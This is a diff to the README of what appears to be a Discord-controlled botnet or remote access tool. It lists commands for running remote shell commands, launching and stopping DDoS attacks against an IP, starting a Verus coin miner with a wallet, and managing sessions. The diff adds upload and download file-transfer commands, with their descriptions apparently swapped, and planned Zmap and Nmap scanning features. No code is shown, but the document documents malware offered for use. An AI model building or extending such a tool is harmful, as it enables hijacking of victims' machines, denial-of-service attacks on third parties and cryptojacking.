@@ -11,6 +11,7 @@
 # Soon
 * Zmap entire network scan
 * Nmap local network scan
+
 * !upload, !download commands
 * !update command
 
@@ -18,6 +19,8 @@
 * !sessions               # List open sessions
 * !kill                   # Close sessions
 * !shell < cmd >          # Run command and if output is not large send as text if large just send log
+* !download < link >      # Upload file to discord
+* !upload < file_name >   # Download file
 * !ddos < ip >            # Start DDoS Attack
 * !stopddos               # Stop DDoS Attack
 * !miner < wallet >       # Start Verus coin miner
